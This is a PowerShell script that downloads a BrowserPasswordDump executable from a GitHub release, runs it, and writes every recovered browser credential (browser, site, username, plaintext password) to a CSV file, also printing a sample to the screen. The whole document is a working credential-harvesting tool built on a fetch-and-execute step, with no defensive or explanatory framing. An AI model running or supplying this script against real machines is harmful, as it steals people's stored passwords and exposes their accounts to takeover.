# BrowserPasswordDump Automated Download and Execution
Write-Host "Downloading and running BrowserPasswordDump..." -ForegroundColor Green

$tempDir = "$env:TEMP\BrowserPasswordDump"
$bpdUrl = "https://github.com/priyankchheda/BrowserPasswordDump/releases/download/v1.0/BrowserPasswordDump.exe"
$outputFile = ".\BrowserPasswordDump_Results.csv"

New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

try {
    # Download BrowserPasswordDump
    Write-Host "Downloading BrowserPasswordDump..." -ForegroundColor Yellow
    $exePath = "$tempDir\BrowserPasswordDump.exe"
    Invoke-WebRequest -Uri $bpdUrl -OutFile $exePath -UseBasicParsing
    
    if (Test-Path $exePath) {
        Write-Host "Running BrowserPasswordDump..." -ForegroundColor Green
        
        # Run the tool
        $result = & $exePath | Out-String
        
        if ($result -match "Found (\d+) passwords") {
            $passwordCount = $matches[1]
            Write-Host "Successfully recovered $passwordCount passwords!" -ForegroundColor Green
            
            # Parse the output and create CSV
            $csvData = @()
            $lines = $result -split "`n" | Where-Object { $_ -match "\|" -and $_ -notmatch "Website" }
            
            foreach ($line in $lines) {
                $parts = $line -split "\|" | ForEach-Object { $_.Trim() }
                if ($parts.Count -ge 4) {
                    $csvData += [PSCustomObject]@{
                        Browser = $parts[0]
                        URL = $parts[1]
                        Username = $parts[2]
                        Password = $parts[3]
                    }
                }
            }
            
            $csvData | Export-Csv $outputFile -NoTypeInformation
            Write-Host "Saved to: $outputFile" -ForegroundColor Green
            
            # Show sample
            $csvData | Select-Object -First 5 | Format-Table -AutoSize
        } else {
            Write-Host "No passwords were recovered." -ForegroundColor Yellow
            Write-Host "Raw output: $result" -ForegroundColor Gray
        }
    }
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
